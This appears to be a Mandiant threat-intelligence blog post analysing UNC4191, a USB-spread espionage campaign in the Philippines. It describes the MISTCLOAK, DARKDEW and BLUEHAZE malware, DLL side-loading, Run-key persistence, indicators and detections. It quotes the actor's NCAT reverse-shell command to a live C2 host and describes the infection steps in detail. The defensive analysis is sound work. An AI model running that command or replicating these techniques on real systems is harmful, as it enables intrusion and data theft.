Always Another Secret: Lifting the Haze on China-nexus
Espionage in Southeast Asia
mandiant.com/resources/blog/china-nexus-espionage-southeast-asia

Mandiant Managed Defense recently identified cyber espionage activity that heavily
leverages USB devices as an initial infection vector and concentrates on the Philippines.
Mandiant tracks this activity as UNC4191 and we assess it has a China nexus.
UNC4191 operations have affected a range of public and private sector entities primarily in
Southeast Asia and extending to the U.S., Europe, and APJ; however, even when targeted
organizations were based in other locations, the specific systems targeted by UNC4191 were
also found to be physically located in the Philippines.
Following initial infection via USB devices, the threat actor leveraged legitimately signed
binaries to side-load malware, including three new families we refer to as MISTCLOAK,
DARKDEW, and BLUEHAZE. Successful compromise led to the deployment of a renamed
NCAT binary and execution of a reverse shell on the victim’s system, providing backdoor
access to the threat actor. The malware self-replicates by infecting new removable drives
that are plugged into a compromised system, allowing the malicious payloads to propagate
to additional systems and potentially collect data from air-gapped systems.
Mandiant Managed Defense performs continuous threat hunting for customers, discovering
evidence of new tactics, techniques, and procedures (TTPs) that can evade traditional
detection mechanisms

In response to this campaign, Mandiant deployed new real-time detections, enhancing
Managed Defense’s protection for our customers from future similar activity. Our Adversary
Operations team created and deployed YARA rules and Mandiant Security Validation
Actions, shared at the end of the post. This blog post details our initial threat hunting
discovery, the newly identified malware families, detection opportunities, and Mandiant’s
assessment about the goals and motivations of the threat actor.

Malware Observed
Mandiant observed UNC4191 deploy the following malware families.

Description

MISTCLOAK

MISTCLOAK is a launcher written in C++ that executes an encrypted
executable payload stored in a file on disk.

BLUEHAZE

BLUEHAZE is a launcher written in C/C++ that launches a copy of NCAT to
create a reverse shell to a hardcoded command and control (C2).

DARKDEW

DARKDEW is a dropper written in C++ that is capable of infecting
removable drives.

NCAT

NCAT is a command-line networking utility that was written for the Nmap
Project to perform a wide-variety of security and administration tasks. While
NCAT may be used for legitimate purposes, threat actors may also use it to
upload or download files, create backdoors or reverse shells, and tunnel
traffic to evade network controls.

Initial Detection
Mandiant Managed Defense customers receive Mandiant’s dedicated proactive Threat
Hunting service. Mandiant's threat hunting team leverages the MITRE ATT&CK® framework
as a guide for developing Hunt Missions that examine endpoint telemetry data, such as
process events, for collection and ATT&CK technique ID tagging. The resulting threat hunting
data set provides the team with wide visibility across the customer base. When performing
analysis, we augment this data set with more targeted sources, like custom, real-time alerting
from our customers’ endpoint detection and response (EDR) technologies.

2/16

Mandiant uses custom tooling to identify ATT&CK technique sequences and clusters
associated with common threat actor behaviors. A technique sequence is useful for
identifying events with a defined order of execution, such as the creation of a local account
(T1136.001) and then addition to the local Administrators group (T1098). A technique cluster
identifies a grouping of techniques that don’t necessarily occur in a specific order. By
focusing on technique sequences and clusters, we reduce the amount of data that needs to
be manually reviewed by analysts.
For example, Mandiant has observed threat actors enumerating domain trusts (T1482) and
querying domain and local group permissions (T1069.001, T1069.002) within a several
minute span (Figure 1). The combined event count for these three techniques occurring on
their own can number in the hundreds of thousands, but by applying technique sequencing
or clustering we can reduce the number of interesting events to a manageable amount.

Figure 1: Visualization of technique sequencing and clustering concepts

3/16

Mandiant identified this UNC4191 campaign by searching for anomalous sequences of
events under our “Mandiant Intelligence: Staging Directories” and “Command and Scripting
Interpreter: Windows Command Shell (T1059.003)” hunting missions (Figure 2).

The techniques performed by UNC4191 led to the development of additional technique
sequences and detection opportunities, as described in the Detection Opportunities section.

UNC4191 Malware Infection Cycle
The overall infection cycle from this campaign can be split into three distinct phases, shown
in Figure 3.

4/16

Figure 3: UNC4191 malware infection cycle

PHASE I: MISTCLOAK
The infection chain begins when a user plugs in a compromised removable device and
manually executes a renamed signed binary from the root directory of the storage volume
(T1091). The initial binaries—named Removable Drive.exe or USB Drive.exe—are versions
of a legitimately signed application called USB Network Gate, developed by the company
Electronic Team, Inc. These are used to side-load the MISTCLOAK malware that
impersonates a legitimate DLL (Table 2).
Table 2: Legitimate USB Network Gate binaries used to side-load MISTCLOAK malware

MD5: f45726a9508376fdd335004fca65392a
File Name(s): D:\Removable Disk.exe, D:\USB Drive.exe
Signature Subject: Electronic Team, Inc
Product Name: USB Network Gate
Original File Name: UsbConfig.exe

File Name(s): D:\Removable Disk.exe, D:\USB Drive.exe
Signature Subject: Electronic Team, Inc
Product Name: USB Network Gate
Original File Name: UsbConfig.exe

The renamed USB Network Gate binaries load a MISTCLOAK DLL named u2ec.dll from the
execution directory on the removable device (T1574.002) (Table 3). MISTCLOAK is a
launcher for the encrypted file usb.ini, which MISTCLOAK reads from the current directory or
the path autorun.inf\Protection for Autorun\System Volume Information\usb.ini. Mandiant
identified the PDB file path G:\project\APT\U盘劫持\new\shellcode\Release\shellcode.pdb in
the MISTCLOAK sample. Notably, the Chinese characters 盘劫持 translate to “disk
hijacking”.
Table 3: MISTCLOAK malware metadata
MD5: 7753da1d7466f251b60673841a97ac5a

PDB filename: G:\project\APT\U盘劫持\new\u2ec\Release\u2ec.pdb (G:\project\APT\U
Disk Hijacking\new\u2ec\Release\u2ec.pdb)

MISTCLOAK then opens Windows Explorer to the location on the removable device where
the user files are stored with the command ‘explorer.exe "<drive>:\autorun.inf\Protection for
Autorun"’.

6/16

Phase II: DARKDEW
The file usb.ini contains an encrypted DLL payload called DARKDEW that is capable of
infecting removable drives. If executed from a removable drive, DARKDEW will launch
explorer.exe via `explorer.exe “<drive>:\autorun.inf\Protection for Autorun”` where <drive> is
a removable drive letter, such as “E”. DARKDEW will then check if either
C:\ProgramData\udisk\disk_watch.exe or C:\ProgramData\udisk\DateCheck.exe exist and
will create the directory C:\ProgramData\udisk if neither are found.
Table 4: DARKDEW malware metadata

Exports: N/A

PDB filename: G:\project\APT\U盘劫持\new\shellcode\Release\shellcode.pdb

DARKDEW then proceeds to copy every file from <drive>:\autorun.inf\Protection for
Autorun\System Volume Information\ to C:\ProgramData\udisk\. Mandiant identified files in
this directory, such as Removable Drive (16GB).lnk, that originated from a system that was
previously compromised by DARKDEW (T1074.001) and copied to a USB device. The
copied data includes the files shown in Table 5 and arbitrary files with the extensions: xlsx,
docx, mp4, device, jpg, pptx, pdf, txt, and lnk files.
Table 5: Files that are copied by DARKDEW from the removable drive to a compromised
system

7/16

C:\ProgramData\udisk\disk_watch.exe
C:\ProgramData\udisk\libeay32.dll
C:\ProgramData\udisk\Removable Disk.exe
C:\ProgramData\udisk\rzlog4cpp.dll
C:\ProgramData\udisk\rzlog4cpp_logger.dll
C:\ProgramData\udisk\ssleay32.dll
C:\ProgramData\udisk\u2ec.dll
C:\ProgramData\udisk\USB Drive.exe
C:\ProgramData\udisk\usb.ini
C:\ProgramData\udisk\UsbConfig.exe
C:\ProgramData\udisk\wuwebv.exe
C:\ProgramData\udisk\DateCheck.exe
C:\ProgramData\udisk\example.jpg
C:\ProgramData\udisk\example.xlsx

DARKDEW will then copy the renamed USB Network Gate binary (e.g., Removable
Drive.exe) to C:\ProgramData\udisk\disk_watch.exe and create persistence with a registry
key value named udisk under HKCU\Software\Microsoft\Windows\CurrentVersion\Run
(T1547.001). Finally, DARKDEW will launch a file named
C:\ProgramData\udisk\DateCheck.exe and then exit.
Table 6: DARKDEW registry persistence
Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value: udisk
Text: c:\programdata\udisk\disk_watch.exe

If DARKDEW is executed from a non-removable drive, the behavior is slightly different.
DARKDEW will create the directory C:\ProgramData\udisk\, then copy every file in the
current directory of the parent executable to C:\ProgramData\udisk\. It will then copy the
parent executable to C:\ProgramData\udisk\disk_watch.exe and launch it. The persistence
mechanism is identical, and it will also launch C:\ProgramData\udisk\DateCheck.exe.

8/16

When DARKDEW is executed within the context of disk_watch.exe, the malware will scan
the system every 10 seconds for removable drives by enumerating volumes from A to Z until
it finds one that is removable. The DARKDEW malware then creates the directory
<drive>\autorun.inf\Protection for Autorun\, sets its attribute to hidden, and copies the
contents of the current working directory of disk_watch.exe to that directory or the
subdirectory <drive>:\autorun.inf\Protection for Autorun\System Volume Information\. This
capability appears to be a method for self-replication and to transfer files that may be
collected from air-gapped systems.

Phase III: BLUEHAZE
The binary DateCheck.exe is a renamed version of a legitimate, signed application called
Razer Chromium Render Process by Razer USA Ltd. (Table 7).
Table 7: Legitimate Razer USA Ltd. binary used to side-load BLUEHAZE malware
MD5: ea7f5b7fdb1e637e4e73f6bf43dcf090
File Name(s): DateCheck.exe
Signature Subject: Razer USA Ltd.
Product Name: Razer Chromium Render Process
Original File Name: RzCefRenderProcess.exe

The renamed Razor application, DateCheck.exe, loads the legitimate file
rzlog4cpp_logger.dll, which calls the getRoot function from the BLUEHAZE malware
RzLog4CPP.dll during C runtime startup (T1574.002).

Compile Time: 2021-09-09T09:27:12Z
Exports: log4cpp.dll
Size: 201,216
PDB filename: N/A

9/16

BLUEHAZE will create a new directory called C:\Users\Public\Libraries\CNNUDTV\, then it
will create the registry key value ACNTV under
HKCU\Software\Microsoft\Windows\CurrentVersion\Run (T1547.001) for persistence. Next,
BLUEHAZE copies all the files from its working directory to
C:\Users\Public\Libraries\CNNUDTV\ and then executes a renamed NCAT executable
wuwebv.exe to create a reverse shell to the hard-coded command and control (C2) address:
closed[.]theworkpc[.]com:80 (T1059). Mandiant has not observed evidence of reverse shell
interaction; however, based on the age of the activity, this may be a result of visibility gaps or
short log retention periods.

cmd.exe /c copy *.* C:\\Users\\Public\\Libraries\\CNNUDTV\\"
cmd.exe /C wuwebv.exe -t -e c:\\windows\\system32\\cmd.exe closed.theworkpc[.]com 80

Outlook and Implications
Based on available data, such as PE compile timestamps for the malware involved in the
aforementioned activity, this campaign potentially extends back to September 2021. Given
the worming nature of the malware involved, we may have detected the later stages of this
malware’s proliferation.
We believe this activity showcases Chinese operations to gain and maintain access to public
and private entities for the purposes of intelligence collection related to China’s political and
commercial interests. Our observations suggest that entities in the Philippines are the main
target of this operation based on the number of affected systems located in this country that
were identified by Mandiant.

Campaign Tracking
Mandiant will continue to monitor UNC4191’s campaign and will provide notable and dynamic
updates regarding changes in tactics and techniques, the introduction of tools with new
capabilities, or the use of new infrastructure to carry out their mission.

Detection Opportunities
Each Mandiant threat hunting discovery is evaluated for opportunities to create new real-time
detections. These detections help Mandiant identify additional activity across our customers’
environments for rapid escalation and triage analysis and aim to reduce threat actor dwell
time.
Following our initial campaign discovery, we immediately searched the entire Managed
Defense customer base for any activity that matched our atomic indicators of interest,
including filenames, file paths, file hashes, IP addresses, domains, and other artifacts. This
uncovered activity on systems at multiple customers.
Additionally, we also created or updated real-time Managed Defense detections to identify
threat actor methodologies, such as:
Deployment or usage of NETCAT and NCAT reverse shells
Modification of registry Run keys for malware persistence, with arguments configured
to execute the Windows binary rundll32.exe
Processes launched from the C:\Users\Public\Libraries\ directory
By combining Mandiant’s threat intelligence service with Managed Defense’s detection
engineering and threat hunting capabilities, we can rapidly identify and provide context
around malicious activity.
